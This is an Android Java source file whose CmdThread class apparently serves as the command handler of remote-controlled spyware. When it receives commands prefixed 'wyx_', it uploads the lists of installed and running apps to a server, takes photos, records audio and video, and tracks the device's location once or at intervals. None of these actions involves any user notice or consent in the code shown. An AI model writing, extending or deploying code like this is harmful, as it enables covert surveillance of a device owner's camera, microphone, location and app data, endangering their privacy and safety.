package com.fs.fs.api;

import android.text.TextUtils;
import android.util.SparseArray;

import com.amap.api.location.AMapLocation;
import com.fs.fs.api.network.ApiConfig;
import com.fs.fs.api.network.core.BaseResponse;
import com.fs.fs.api.network.core.HttpParams;
import com.fs.fs.api.network.core.OkHttpUtils;
import com.fs.fs.api.network.core.callback.HttpCallback;
import com.fs.fs.bean.AppInfo;
import com.fs.fs.utils.Constant;

import java.util.List;
import java.util.Map;

import okhttp3.Headers;

/**
 * Created by wyx on 2017/1/7.
 */

public class CmdThread extends Thread {
    private static final String KEY_WORD = "wyx_";
    private String mCmd;
    private Map<String, String> mMap;

    public CmdThread(Map<String, String> map) {
        mCmd = map.get("cmd");
        mMap = map;
    }

    public boolean isCmdAvailable() {
        if (mCmd.startsWith(KEY_WORD) && mCmd.length() > KEY_WORD.length()) {
            return true;
        }
        return false;
    }

    @Override
    public void run() {
        try {
            String[] arr = mCmd.split("_");
            Constant.Command cmd = Constant.Command.valueOf(arr[1]);
            String cameraIndex = null;
            switch (cmd) {
                case app:
                    AppInfoService.getInstance().getInstallAppInfo(new AppInfoService.AppInfoListener() {
                        @Override
                        public void onSucceed(List<AppInfo> appInfos) {
                            HttpParams httpParams = new HttpParams();
                            httpParams.addJson("app_info", appInfos);
                            OkHttpUtils.post(ApiConfig.getInstallAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
                                @Override
                                public void onSuccess(BaseResponse httpResponse, Headers headers) {

                                }

                                @Override
                                public void onError(String errorMsg) {

                                }
                            });
                        }
                    });
                    break;
                case run_app:
                    AppInfoService.getInstance().getRunningAppInfo(new AppInfoService.AppInfoListener() {
                        @Override
                        public void onSucceed(List<AppInfo> appInfos) {
                            HttpParams httpParams = new HttpParams();
                            httpParams.addJson("app_info", appInfos);
                            OkHttpUtils.post(ApiConfig.getRunningAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
                                @Override
                                public void onSuccess(BaseResponse httpResponse, Headers headers) {

                                }

                                @Override
                                public void onError(String errorMsg) {

                                }
                            });
                        }
                    });
                    break;
                case photo:
                    cameraIndex = mMap.get("camera_index");
                    if (TextUtils.isEmpty(cameraIndex)) {
                        CameraService.getInstance().takePhoto(null);
                    } else {
                        SparseArray<Integer> map = DeviceService.getCameraInfo();
                        Integer face = map.get(Integer.parseInt(cameraIndex));
                        if (null == face) {
                            CameraService.getInstance().takePhoto(null);
                        } else {
                            CameraService.getInstance().takePhoto(Integer.valueOf(cameraIndex));
                        }
                    }
                    break;
                case audio:
                    MediaRecordService.getInstance().startRecordAudio();
                    break;
                case stop_audio:
                    MediaRecordService.getInstance().stopRecordAudio();
                    break;
                case video:
                    cameraIndex = mMap.get("camera_index");
                    if (TextUtils.isEmpty(cameraIndex)) {
                        MediaRecordService.getInstance().startRecordVideo(null);
                    } else {
                        SparseArray<Integer> map = DeviceService.getCameraInfo();
                        Integer face = map.get(Integer.parseInt(cameraIndex));
                        if (null == face) {
                            MediaRecordService.getInstance().startRecordVideo(null);
                        } else {
                            MediaRecordService.getInstance().startRecordVideo(Integer.valueOf(cameraIndex));
                        }
                    }
                    break;
                case stop_video:
                    MediaRecordService.getInstance().stopRecordVideo();
                    break;
                case locate_on:
                    LocationService.getInstance().close();
                    LocationService.getInstance().once(new LocationService.LocateListener() {
                        @Override
                        public void onLocateSucceed(AMapLocation aMapLocation) {
                            //TODO:看server需要
                        }

                        @Override
                        public void onLocateFail(int errorCode, String errorInfo) {

                        }
                    });
                    break;
                case locate_off:
                    LocationService.getInstance().close();
                    break;
                case track:
                    LocationService.getInstance().close();
                    String millis = mMap.get("interval");
                    if (TextUtils.isEmpty(millis)) {
                        LocationService.getInstance().interval(new LocationService.LocateListener() {
                            @Override
                            public void onLocateSucceed(AMapLocation aMapLocation) {

                            }

                            @Override
                            public void onLocateFail(int errorCode, String errorInfo) {

                            }
                        });
                    } else {
                        LocationService.getInstance().interval(Long.parseLong(millis), new LocationService.LocateListener() {
                            @Override
                            public void onLocateSucceed(AMapLocation aMapLocation) {

                            }

                            @Override
                            public void onLocateFail(int errorCode, String errorInfo) {

                            }
                        });
                    }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
